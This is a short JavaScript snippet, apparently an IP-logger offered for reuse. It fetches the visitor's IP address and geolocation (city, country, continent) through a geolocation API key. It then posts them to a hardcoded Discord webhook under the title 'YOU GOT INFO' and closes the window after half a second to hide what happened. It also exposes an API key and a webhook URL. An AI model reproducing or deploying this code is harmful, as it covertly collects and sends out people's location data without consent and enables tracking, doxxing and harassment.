$.getJSON("https://ipgeolocation.abstractapi.com/v1/?api_key=bb783e8a545249f0a67833aa2f453e83", function(data) { //Make sure to use this api or use another but you got to change the values down below
  var request1 = new XMLHttpRequest();
  request1.open("POST", "https://discord.com/api/webhooks/977413083192520784/u_JLNbWp365OxQldT3LXQc4XfzVgKs6mBDOlyeZ8i1GCCCio3ZsEjYTqzCtmcK4vDHV8");

  request1.setRequestHeader('Content-type', 'application/json');

  var t = {
    username: "uwu",
    avatar_url: null,
    content: "",
    embeds: [{
      color: "4700374",
      title: "YOU GOT INFO",
      fields: [{
          name: "IP",
          value: data.ip_address
        },
        {
          name: "CITY",
          value: data.city
        },
        {
          name: "COUNTRY",
          value: data.country
        },
        {
          name: "CONTINENT",
          value: data.continent
        },
      ],
    }]
  };

  request1.send(JSON.stringify(t));
})

setTimeout(() => window.close(), 550)
//credit if you make a better one.
